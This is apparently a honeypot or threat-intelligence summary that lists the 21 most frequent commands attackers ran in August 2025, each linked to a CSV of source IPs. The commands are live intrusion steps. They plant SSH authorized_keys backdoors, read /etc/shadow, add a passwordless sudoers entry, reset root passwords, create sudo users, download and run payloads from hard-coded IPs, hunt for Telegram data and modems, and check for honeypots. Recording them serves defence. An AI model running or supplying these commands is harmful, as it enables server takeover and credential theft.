# TOP COMMANDS AND THEIR SOURCES
1. cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~

  ->  /2025-08/ip/1.csv

2. cd ~; chattr -ia .ssh; lockr -ia .ssh

   -> /2025-08/ip/2.csv

3. uname -s -v -n -r –m

   -> /2025-08/ip/3.csv

4. ps -ef | grep '[Mm]iner'

   ->  /2025-08/ip/4.csv

5. chmod +x ./.3817918409420141445/sshd;nohup ./.3817918409420141445/sshd 103.145.145.76 77.91.65.117 78.135.85.233 220.181.172.244 154.92.131.155 45.159.189.193 154.211.13.102 170.84.39.236 117.62.201.93 125.88.174.233 111.31.229.233 47.100.121.202 47.94.87.144 154.124.240.229 54.75.66.207 177.44.220.225 125.88.174.215 221.179.57.254 158.51.96.38 110.40.20.55 43.239.110.69 188.166.208.251 103.164.9.41 52.91.199.247 36.163.199.18 212.115.54.22 162.253.132.206 159.203.108.2 45.55.30.94 221.14.147.153 183.221.214.95 180.163.61.238 122.228.62.150 154.221.23.116 115.190.97.236 195.182.25.234 101.91.181.235 113.142.72.13 193.233.252.9 112.171.213.120 43.249.193.101 1.62.252.20 115.68.194.209 47.79.43.177 45.45.239.129 85.133.221.37 182.151.55.219 41.135.81.54 190.123.74.50 117.149.247.143 120.48.32.185 &

  -> /2025-08/ip/5.csv

6.  df -h | head -n 2 | awk 'FNR == 2 {print $2;}

   -> /2025-08/ip/6.csv

7. cat /proc/cpuinfo | grep model | grep name | wc –l

   -> /2025-08/ip/7.csv
8. ls -lh $(which ls)

   -> /2025-08/ip/8.csv

9. free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}

    -> /2025-08/ip/9.csv

10. cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}

    -> /2025-08/ip/10.csv

11. uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers;chsh -s /bin/sh daemon;echo Password123 |passwd daemon --stdin;mkdir ~/.ssh;chattr -ia ~/.ssh/* ~/.ssh;wget http://162.215.218.82/ns1.jpg -O ~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys;chmod 700 ~/ ~/.ssh;wget http://162.215.218.82/ns3.jpg -O /tmp/x;chmod +x /tmp/x;/tmp/x;mv /tmp/x /tmp/o;/tmp/o;rm -f /tmp/o;mkdir /sbin/.ssh;cp ~/.ssh/authorized_keys /sbin/.ssh;chown daemon.daemon /sbin/.ssh /sbin/.ssh/*;chmod 700 /sbin/.ssh;chmod 600 /sbin/.ssh/authorized_keys;wget http://162.215.218.82/oto -O /etc/oto;chmod 755 /tmp/oto;/tmp/oto;curl http://162.215.218.82/oto -o /tmp/oto;chmod 755 /tmp/oto;/tmp/oto;rm -f /tmp/oto

  -> /2025-08/ip/11.csv

12. ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*

 -> /2025-08/ip/12.csv

13. chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\
 
 -> /2025-08/ip/13.csv

14. rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;

 -> /2025-08/ip/14.csv

15. echo \"root:voSDzeRvq4C4\"|chpasswd|bash

 -> /2025-08/ip/15.csv

16. uname=$(uname -s -v -n -m 2>/dev/null);; \t\tarch=$(uname -m 2>/dev/null);; \t\tuptime=$(awk '{u=int($1);d=int(u/86400);h=int((u%86400)/3600);m=int((u%3600)/60);s=\"\";if(d>0)s=s d\"d\";if(h>0){if(s!=\"\")s=s\", \";s=s h\"h\"}if(m>0||s==\"\"){if(s!=\"\")s=s\", \";s=s m\"m\"}print s}' /proc/uptime 2>/dev/null);; \t\t[ -z \"$uptime\" ] && secondsStr=$(cat /proc/uptime | cut -d' ' -f1 | cut -d. -f1) && [ -n \"$secondsStr\" ] && seconds=$((secondsStr)) && d=$((seconds/86400)) && h=$(( (seconds%86400)/3600 )) && m=$(( (seconds%3600)/60 )) && uptime=\"\" && [ $d -gt 0 ] && uptime=\"${uptime}${d}d\" && [ $h -gt 0 ] && { [ -n \"$uptime\" ] && uptime=\"$uptime, \"; uptime=\"${uptime}${h}h\"; } && { [ $m -gt 0 ] || [ -z \"$uptime\" ]; } && { [ -n \"$uptime\" ] && uptime=\"$uptime, \"; uptime=\"${uptime}${m}m\"; };; \t\tcpus=$( (nproc || grep -c \"^processor\" /proc/cpuinfo) 2>/dev/null | head -1);; \t\tcpu_model=$( (grep -m1 \"model name\" /proc/cpuinfo | cut -d: -f2 | sed 's/^ //;s/ *$//' || lscpu | grep -m1 \"Model name\" | cut -d: -f2 | sed 's/^ //;s/ *$//') 2>/dev/null);; \t\tgpu_info=$( (lspci | grep -i vga; lspci | grep -i nvidia) 2>/dev/null | head -n5);; \t\tcat_help=$((cat --help 2>&1 | tr '\\n' ' ') || cat --help 2>&1);; \t\tls_help=$((ls --help 2>&1 | tr '\\n' ' ') || ls --help 2>&1);; \t\tlast_output=$((last | tail -n 10) || last);; \t\techo \"UNAME:$uname\";; \t\techo \"ARCH:$arch\";; \t\techo \"UPTIME:$uptime\";; \t\techo \"CPUS:$cpus\";; \t\techo \"CPU_MODEL:$cpu_model\";; \t\techo \"GPU:$gpu_info\";; \t\techo \"CAT_HELP:$cat_help\";; \t\techo \"LS_HELP:$ls_help\";; \t\techo \"LAST:$last_output\";

 -> /2025-08/ip/16.csv

17. cat /proc/uptime | cut -d -f1 | cut -d. -f1

 -> /2025-08/ip/17.csv

18. apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 y5g3uNtj) system && sudo usermod -aG sudo system

 -> /2025-08/ip/18.csv

19. wget http://23.146.184.21/abd.sh; chmod 777 *; sh abd.sh x86

 -> /2025-08/ip/19.csv

20. cpu=$(grep 'model name' /proc/cpuinfo 2>/dev/null || echo \"\"); memtotal=$(grep MemTotal /proc/meminfo 2>/dev/null || echo \"\"); if [ -z \"$cpu\" ] || [ -z \"$memtotal\" ]; then; echo \"honeypot\"; else; echo \"valid\"; fi

 -> /2025-08/ip/20.csv

21. env TERM=dumb bash --noprofile --norc -c ' cpu=$(grep \"model name\" /proc/cpuinfo 2>/dev/null || echo \"\") memtotal=$(grep MemTotal /proc/meminfo 2>/dev/null || echo \"\") if [ -z \"$cpu\" ] || [ -z \"$memtotal\" ]; then echo \"honeypot\" else echo \"valid\" fi’

     -> /2025-08/ip/21.csv

 -> /2025-08/ip/21.csv
 
